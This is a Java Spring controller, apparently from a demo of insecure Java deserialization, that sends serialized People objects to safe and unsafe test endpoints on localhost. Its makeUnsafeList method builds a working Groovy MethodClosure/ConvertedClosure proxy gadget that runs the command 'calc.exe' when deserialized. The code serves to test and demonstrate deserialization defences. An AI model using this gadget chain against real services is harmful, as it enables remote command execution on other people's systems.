package com.defensepoint.rce.controller;

import com.defensepoint.rce.ClientApplication;
import com.defensepoint.rce.entity.People;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;
import org.springframework.http.HttpEntity;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestTemplate;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.util.ArrayList;
import java.util.List;

@RestController
public class PeopleController {

    @GetMapping("/people/safe-input/unsafe-test")
    public String safeInputUnsafeTest() throws IOException {
        List<String> names = makeSafeList();
        People people = new People(names);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(people);
        byte[] bytes = byteArrayOutputStream.toByteArray();

        HttpEntity<byte[]> entity = new HttpEntity<>(bytes);
        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> response = restTemplate.postForEntity("http://localhost:8181/people/safe-input/unsafe-test", entity, String.class);

        return response.getBody();
    }

    @GetMapping("/people/safe-input/safe-test")
    public String safeInputSafeTest() throws IOException {
        List<String> names = makeSafeList();
        People people = new People(names);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(people);
        byte[] bytes = byteArrayOutputStream.toByteArray();

        HttpEntity<byte[]> entity = new HttpEntity<>(bytes);
        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> response = restTemplate.postForEntity("http://localhost:8181/people/safe-input/safe-test", entity, String.class);

        return response.getBody();
    }

    @GetMapping("/people/unsafe-input/safe-test")
    public String unsafeInputSafeTest() throws IOException {
        List<String> names = makeUnsafeList();
        People people = new People(names);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(people);
        byte[] bytes = byteArrayOutputStream.toByteArray();

        HttpEntity<byte[]> entity = new HttpEntity<>(bytes);
        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> response = restTemplate.postForEntity("http://localhost:8181/people/unsafe-input/safe-test", entity, String.class);

        return response.getBody();
    }

    @GetMapping("/people/unsafe-input/unsafe-test")
    public String peopleUnsafeInputUnsafeTest() throws IOException {
        List<String> names = makeUnsafeList();
        People people = new People(names);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(people);
        byte[] bytes = byteArrayOutputStream.toByteArray();

        HttpEntity<byte[]> entity = new HttpEntity<>(bytes);
        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> response = restTemplate.postForEntity("http://localhost:8181/people/unsafe-input/unsafe-test", entity, String.class);

        return response.getBody();
    }

    @GetMapping("/people/safe-input/nested-unsafe-test")
    public String peopleSafeInputNestedUnsafeTest() throws IOException {
        List<String> names = makeSafeList();
        People people = new People(names);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(people);
        byte[] bytes = byteArrayOutputStream.toByteArray();

        HttpEntity<byte[]> entity = new HttpEntity<>(bytes);
        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> response = restTemplate.postForEntity("http://localhost:8181/people/safe-input/nested-unsafe-test", entity, String.class);

        return response.getBody();
    }

    @GetMapping("/people/unsafe-input/safe-test/contrast")
    public String unsafeInputSafeTestContarstSuggestion() throws IOException {
        List<String> names = makeUnsafeList();
        People people = new People(names);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(people);
        byte[] bytes = byteArrayOutputStream.toByteArray();

        HttpEntity<byte[]> entity = new HttpEntity<>(bytes);
        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> response = restTemplate.postForEntity("http://localhost:8181/people/unsafe-input/safe-test/contrast", entity, String.class);

        return response.getBody();
    }

    @GetMapping("/people/safe-input/safe-test/contrast")
    public String safeInputSafeTestContarstSuggestion() throws IOException {
        List<String> names = makeSafeList();
        People people = new People(names);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(people);
        byte[] bytes = byteArrayOutputStream.toByteArray();

        HttpEntity<byte[]> entity = new HttpEntity<>(bytes);
        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> response = restTemplate.postForEntity("http://localhost:8181/people/safe-input/safe-test/contrast", entity, String.class);

        return response.getBody();
    }

    private static List<String> makeUnsafeList() {

        String COMMAND = "calc.exe";

        MethodClosure methodClosure = new MethodClosure(COMMAND, "execute");
        ConvertedClosure iteratorHandler = new ConvertedClosure(methodClosure, "iterator");

        List list = (List) Proxy.newProxyInstance(
                ClientApplication.class.getClassLoader(), new Class<?>[]{List.class}, iteratorHandler
        );

        return list;
    }

    private static List<String> makeSafeList() {
        List<String> niceList = new ArrayList<>();
        niceList.add("bob");
        niceList.add("sarah");
        return niceList;
    }
}
